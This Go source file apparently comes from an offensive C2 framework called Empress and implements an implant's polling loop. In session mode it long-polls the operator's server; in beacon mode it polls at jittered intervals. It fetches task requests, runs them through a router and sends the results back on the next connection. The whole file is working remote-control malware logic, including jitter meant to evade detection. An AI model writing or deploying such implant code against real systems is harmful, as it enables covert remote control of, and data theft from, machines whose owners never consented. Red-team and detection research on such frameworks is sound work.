//go:build debug

package c2

import (
	"bytes"
	"encoding/json"
	"github.com/pygrum/Empress/config"
	"github.com/pygrum/Empress/transport"
	log "github.com/sirupsen/logrus"
	"io"
	"math/rand"
	"net/http"
	"time"
)

// Poll implements a long polling client.
// New registration data and an error is returned when the server is reported as inactive (connection-refused),
// client is no longer authorized (401), or any other failure occurs
func (c *Client) Poll() (*transport.Registration, error) {
	switch config.C.Mode {
	case config.ModeSession:
		log.Info("mode SESSION: long polling")
		// long polling mode - we send a response as soon as it's ready
		for {
			reg, err := c.poll()
			if reg != nil || err != nil {
				return reg, err
			}
		}
	case config.ModeBeacon:
		log.Info("mode BEACON: simple polling")
		// beacon mode, we send responses in intervals
		tickSalt := config.C.BeaconSalt

		r := rand.New(rand.NewSource(time.Now().Unix()))
		ticker := time.NewTicker((config.C.BeaconInterval * 1000 * time.Millisecond) -
			(tickSalt * time.Millisecond))
		for _ = range ticker.C {
			// sleep for a random time between 0 and tickSalt milliseconds.
			// because the ticker ticks every interval-tickSalt seconds,
			time.Sleep(time.Duration(r.Intn(int(tickSalt))) * time.Millisecond)
			reg, err := c.poll()
			if reg != nil || err != nil {
				return reg, err
			}
		}
	}
	return nil, nil
}

func (c *Client) poll() (*transport.Registration, error) {
	emptyReg := Registration(nil)
	var body io.Reader
	// on first poll, our request isn't processed
	if c.Response() == nil {
		body = http.NoBody
	} else {
		data, err := json.Marshal(c.Response())
		if err != nil {
			return emptyReg, err
		}
		log.Info("sending body: %s", data)
		body = bytes.NewReader(data)
	}
	req, err := http.NewRequest(http.MethodGet, c.Address, body)
	if err != nil {
		return emptyReg, err
	}
	resp, err := c.HttpClient.Do(req)
	if err != nil {
		return Registration(c.Response()), err
	}
	log.Infof("sent request: %v, received response: %v", req, resp)
	if resp.StatusCode != http.StatusOK {
		// could be unauthorised, must re-register
		reg := Registration(c.Response())
		return reg, nil
	}
	// TODO: Process c2 req (resp) using the router. Also, check out how much work it is to integrate with mythic
	// TODO: from a code perspective, compared to this :)
	taskReq := &transport.Request{}
	log.Info("received response body: %v", resp.Body)
	if err = json.NewDecoder(resp.Body).Decode(taskReq); err != nil {
		return emptyReg, err
	}
	taskResp := c.router.handle(taskReq)
	c.SetResponse(taskResp)
	// will loop and send response on the next connection
	return nil, nil
}
